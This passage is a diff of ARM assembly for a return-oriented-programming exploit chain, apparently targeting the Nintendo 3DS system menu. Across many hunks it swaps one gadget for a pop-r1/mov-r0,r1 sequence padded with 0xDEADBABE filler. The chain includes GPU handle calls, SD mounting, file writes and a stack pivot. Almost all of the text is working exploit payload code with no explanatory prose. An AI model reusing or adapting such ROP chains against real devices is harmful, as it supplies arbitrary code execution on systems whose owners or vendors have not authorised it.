+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x00040040
+		.word appid
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -1086,8 +1278,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word MENU_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word cmd_data ; r1 (cmd addr)
@@ -1100,8 +1296,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_GSPGPU_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word out_ptr ; r1 (output buffer)
@@ -1114,8 +1314,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word name
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word name
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_MOUNTSDMC
 .endmacro
@@ -1126,8 +1330,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word out_ptr
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word out_ptr
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC
 		.word addr
@@ -1147,8 +1355,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word f
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word f
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC
 		.word name
@@ -1167,8 +1379,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word f
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word f
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC
 		.word bytes_written ; bytes written
@@ -1189,8 +1405,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word f
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word f
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC
 		.word bytes_written ; bytes written
@@ -1211,8 +1431,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word f
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word f
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC
 		.word 0x00000000 ; r1 (?)
@@ -1232,8 +1456,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word f
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word f
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_POP_R4PC
 		.word 0xDEADBABE ; r4 (garbage)
@@ -1246,8 +1474,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word nanosec_low ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word nanosec_low ; r0
+	.word ROP_MENU_POP_R1PC
+		.word nanosec_low
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word nanosec_high ; r1
@@ -1266,8 +1498,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word a ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word a ; r0
+	.word ROP_MENU_POP_R1PC
+		.word a
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word dst ; r4
@@ -1280,8 +1516,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word a ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word a ; r0
+	.word ROP_MENU_POP_R1PC
+		.word a
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word dst ; r4
@@ -1294,8 +1534,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word src ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word src ; r0
+	.word ROP_MENU_POP_R1PC
+		.word src
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_POP_R4PC
 		.word dst ; r4
@@ -1308,8 +1552,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word src ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word src ; r0
+	.word ROP_MENU_POP_R1PC
+		.word src
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_POP_R4PC
 		.word 0xDEADBABE ; r4
@@ -1320,8 +1568,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word src ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word src ; r0
+	.word ROP_MENU_POP_R1PC
+		.word src
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_POP_R4PC
 		.word 0xDEADBABE ; r4 (garbage)
@@ -1340,8 +1592,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word src ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word src ; r0
+	.word ROP_MENU_POP_R1PC
+		.word src
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_POP_R4PC
 		.word 0xDEADBABE ; r4 (garbage)
@@ -1358,8 +1614,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word src ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word src ; r0
+	.word ROP_MENU_POP_R1PC
+		.word src
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_POP_R4PC
 		.word 0xDEADBABE ; r4 (garbage)
@@ -1374,8 +1634,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word a ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word a ; r0
+	.word ROP_MENU_POP_R1PC
+		.word a
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word b ; r1
@@ -1392,8 +1656,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word a ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word a ; r0
+	.word ROP_MENU_POP_R1PC
+		.word a
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word b ; r1
@@ -1426,8 +1694,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word total
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word total
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word DUMMY_PTR - 0x10
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
@@ -1438,8 +1710,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word MENU_OBJECT_LOC + @@busyloop_pivot - 4
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word MENU_OBJECT_LOC + @@busyloop_pivot - 4
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word ROP_MENU_STACK_PIVOT
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_STRNE_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
